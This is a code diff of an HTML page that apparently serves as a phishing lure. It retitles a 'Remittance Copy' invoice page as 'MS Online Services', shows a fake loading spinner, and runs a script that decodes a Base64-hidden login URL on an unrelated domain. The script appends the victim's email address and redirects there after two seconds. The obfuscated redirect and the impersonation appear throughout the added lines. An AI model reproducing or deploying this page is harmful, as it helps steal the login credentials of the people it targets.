@@ -3,7 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remittance Copy</title>
+    <title>MS Online Services</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            overflow: hidden;
+        }
+
+        #loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            position: absolute;
+            z-index: 1000;
+            text-align: center;
+        }
+
+        .loader {
+            width: 50px;
+            padding: 8px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            background: #87CEEB;
+            --_m: 
+                conic-gradient(#0000 10%,#000),
+                linear-gradient(#000 0 0) content-box;
+            -webkit-mask: var(--_m);
+                    mask: var(--_m);
+            -webkit-mask-composite: source-out;
+                    mask-composite: subtract;
+            animation: l3 1s infinite linear;
+        }
+
+        @keyframes l3 {
+            to { transform: rotate(1turn); }
+        }
+    </style>
+</head>
+<body>
+    <div id="loader-container">
+        <div class="loader"></div>
+    </div>
+
     <script>
         // Base64 encoded redirect URL
         const encodedUrl = "aHR0cHM6Ly9sb2dpbi5hY2phcnZpc2J1aWxkZXJzLmNvbS9Sc3BLdE9odQ==";
@@ -15,38 +73,13 @@
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email'); // Get the 'email' parameter
 
-        // Add email as a query parameter to the redirect URL without encoding
+        // Add email as a query parameter to the redirect URL
         const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
 
-        // Delay the redirect to display the message first
+        // Simulate loading for 2 seconds and then redirect
         setTimeout(() => {
             window.location.href = redirectUrl;
-        }, 500); // Redirect after 1.5 seconds
+        }, 2000); // Adjust loading duration if needed
     </script>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            color: #333;
-        }
-        p {
-            font-size: 1.2rem;
-            font-weight: bold;
-        }
-        iframe {
-            border: none;
-            width: 100%;
-            height: 100vh;
-        }
-    </style>
-</head>
-<body>
-<!--     <iframe src="https://filetransfersecure.vercel.app/INV-33234.pdf"></iframe> -->
-
 </body>
 </html>
